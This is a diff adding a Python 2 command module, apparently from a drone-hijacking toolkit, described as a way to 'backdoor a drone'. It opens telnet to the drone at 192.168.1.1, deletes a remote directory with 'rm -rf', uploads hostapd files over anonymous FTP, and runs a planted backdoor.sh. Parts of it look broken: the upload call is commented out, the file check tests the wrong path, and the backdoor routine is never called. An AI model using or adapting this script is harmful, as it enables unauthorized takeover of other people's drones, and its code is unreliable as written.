@@ -1,0 +1,75 @@
+import ftplib, os
+from telnetlib import Telnet
+from lib.parser import SkyjackArgumentParser
+
+
+class wpa2command():
+    def __init__(self):
+        self.cmd = "wpa2"
+        self.files = os.walk('res/hostapd')
+        self.remote_path = '/data/video/hostapd'
+        self.timeout = 5
+        self.parser = SkyjackArgumentParser(prog=self.cmd, description="backdoor a drone")
+
+    def execute(self, args):
+        "backdoor a drone"
+
+        #clean folder
+        tn = Telnet('192.168.1.1')
+        self.tcmd('rm -rf ' + self.remote_path, tn)
+        self.tcmd('mkdir -p ' + os.path.join(self.remote_path, 'lib'), tn)
+        tn.close()
+
+        #upload
+        self.upload()
+
+
+    def upload(self):
+
+        try:
+            session = ftplib.FTP('192.168.1.1')  # anonymous
+            for dir_name, _, dir_files in self.files:
+
+                for f in dir_files:
+                    if os.path.isfile(f):
+                        target =  dir_name[4:]
+                        print target
+                        print '[*] uploading %s/%s --> /data/video/%s' % (dir_name,f, target)
+                        file = open(os.path.join(os.curdir, dir_name, f), 'rb')
+                        #session.storbinary('STOR ' + target, file)
+                        file.close()
+            session.quit()
+        except Exception as e:
+            print '[ERROR] ftp upload failed'
+            print e
+
+        finally:
+            return 0
+
+
+    def executeBackdoor(self):
+        try:
+            tn = Telnet('192.168.1.1')
+            print '[+] connection established'
+            tn.read_until('#', self.timeout)
+
+            #make
+            self.tcmd('chmod +x /data/video/backdoor.sh', tn)
+            self.tcmd('/data/video/backdoor.sh', tn)
+
+        except Exception as e:
+            print '[ERROR] telnet command execution failed'
+            print e.message
+
+        finally:
+            tn.close()
+            return 0
+
+    def tcmd(self, cmd, tn):
+        print '[+] executing %s ' % cmd
+        tn.write(cmd + '\n')
+        print tn.read_until('#', self.timeout)
+
+        return 0
+
+
